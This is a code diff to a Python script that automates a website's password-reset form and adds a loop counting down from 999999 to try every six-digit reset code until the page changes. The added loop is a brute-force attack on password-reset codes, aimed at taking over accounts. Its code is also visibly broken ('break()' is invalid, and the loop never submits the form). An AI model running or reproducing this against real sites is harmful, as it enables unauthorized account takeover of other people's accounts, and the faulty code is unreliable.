@@ -71,13 +71,20 @@ print(form)
 y = input('Continue? 1,2, else:')
 """reset code input"""
 browser.select_form(nr=0)
+url1 = browser.geturl()
 print(browser.geturl())
-page = requests.get(browser.geturl())
-finder = BeautifulSoup(page.content, "html.parser")
-print(finder.find(string="6 characters long:"))
 reset = input('Code: ')
 browser.form['n'] = reset
 browser.submit()
+x = 999999
+while x > 99999:
+  browser.select_form(nr=0)
+  browser.form['n'] = x
+  url = browser.geturl()
+  if url != url1:
+    break()
+  else:
+    x -= 1
 """new password"""
 new = input('New Password: ')
 browser.select_form(nr=0)
